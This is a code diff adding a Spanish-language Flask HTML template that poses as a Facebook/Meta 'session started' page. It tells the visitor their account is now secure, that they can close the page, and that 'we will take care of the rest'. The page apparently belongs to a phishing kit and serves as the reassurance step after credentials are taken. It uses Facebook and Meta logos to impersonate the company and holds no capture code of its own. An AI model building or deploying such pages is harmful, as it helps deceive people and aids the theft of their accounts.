@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sesión iniciada</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo-img {
+            width: 80px;
+            margin-top: 40px;
+        }
+
+        .success-message {
+            font-size: 16px;
+            color: #1c1e21;
+            font-weight: bold;
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+
+        .meta-img {
+            width: 100px;
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Logo de Facebook -->
+    <img src="{{ url_for('static', filename='facebook_logo.png') }}" alt="Logo Facebook" class="logo-img">
+
+    <!-- Mensaje centrado -->
+    <div class="success-message">
+         Has iniciado sesión correctamente.<br>Gracias por proteger tu cuenta.<br>Tu cuenta de Facebook ahora es segura, puedes cerrar esta pagina nosotros nos encargaremos del resto.
+    </div>
+
+    <!-- Logo de Meta -->
+    <img src="{{ url_for('static', filename='meta_logo.png') }}" alt="Logo Meta" class="meta-img">
+
+</body>
+</html>
